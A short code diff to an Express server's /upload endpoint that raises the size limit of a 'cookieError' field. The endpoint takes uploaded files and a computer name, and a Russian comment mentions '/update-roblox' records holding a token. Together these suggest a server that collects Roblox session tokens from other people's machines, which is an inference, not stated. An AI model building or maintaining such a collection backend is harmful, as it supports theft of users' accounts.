@@ -381,7 +381,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const pcName = computerInfo.name;
 
   const diagnostics = {
-    cookieError: sanitize(req.body.cookieError, 2000) || ''
+    cookieError: sanitize(req.body.cookieError, 6000) || ''
   };
 
   // Не удаляем существующие записи — /update-roblox мог уже создать запись с токеном
